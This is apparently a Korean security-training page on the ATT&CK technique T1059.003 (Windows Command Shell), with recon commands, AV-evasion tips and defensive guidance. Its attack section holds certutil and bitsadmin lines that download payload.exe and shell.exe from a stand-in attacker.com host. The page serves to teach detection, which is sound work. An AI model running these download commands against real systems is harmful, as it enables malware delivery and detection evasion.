T1059.003: Windows Command Shell

Execution

Windows Command Shell

cmd.exe를 이용한 시스템 정찰, 파일 조작, 네트워크 명령 실행

#1. 개념과 원리

Windows Command Shell이란?

cmd.exe는 Windows의 기본 명령줄 인터프리터로, 공격자가 시스템 정찰, 파일 조작, 네트워크 명령을 실행하는 데 활용합니다. 모든 Windows 시스템에 기본 설치되어 있어 별도 도구 없이 공격이 가능합니다. 배치 파일(.bat/.cmd)을 통한 자동화 공격에도 사용됩니다.

시스템 정찰

whoami, systeminfo, ipconfig 등

LOLBins 활용

certutil, bitsadmin으로 파일 다운로드

배치 자동화

.bat 파일로 공격 체인 자동 실행

#2. 공격 기법 분석

# cmd.exe 기반 시스템 정찰
whoami /all & systeminfo & ipconfig /all
net user & net localgroup administrators
# LOLBins 파일 다운로드
certutil -urlcache -split -f http://attacker.com/payload.exe C:\Temp\svc.exe
bitsadmin /transfer dl http://attacker.com/shell.exe C:\Temp\shell.exe

공격 분석

  • 정찰: whoami, net, systeminfo로 환경 파악
  • LOLBins: certutil, bitsadmin으로 AV 우회 다운로드
  • 난독화: ^ 삽입, %var% 치환으로 탐지 우회
  • 배치 파일: for /F 루프로 대량 명령 자동화

#3. 탐지 및 방어 + 퀴즈

방어 전략

  • 프로세스 모니터링: cmd.exe 생성 이벤트(Event 4688) 감사
  • AppLocker: cmd.exe 실행 제한 정책
  • 명령줄 감사: 명령줄 인수 로깅 활성화
  • EDR: certutil/bitsadmin 비정상 사용 탐지
  • WDAC: Windows Defender Application Control
